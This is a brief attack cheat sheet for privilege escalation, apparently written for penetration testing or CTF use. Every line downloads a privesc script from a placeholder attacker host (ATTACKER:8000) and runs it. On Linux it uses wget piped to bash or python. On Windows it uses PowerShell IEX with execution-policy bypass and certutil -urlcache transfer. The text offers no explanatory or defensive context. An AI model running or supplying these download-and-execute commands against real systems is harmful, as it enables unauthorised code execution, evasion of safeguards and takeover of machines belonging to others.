# Option A: Bash (guaranteed everywhere)
wget http://ATTACKER:8000/privesc.sh && bash privesc.sh

# Option B: Python (cleaner output, more checks)
wget http://ATTACKER:8000/privesc.py && python3 privesc.py


# Option A: Download and run
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER:8000/privesc.ps1')"

# Option B: Transfer and run
certutil -urlcache -f http://ATTACKER:8000/privesc.ps1 C:\Windows\Temp\privesc.ps1
powershell -ep bypass -f C:\Windows\Temp\privesc.ps1

# Option C: From your attacker box (just the cheatsheet)
python3 privesc.py --windows
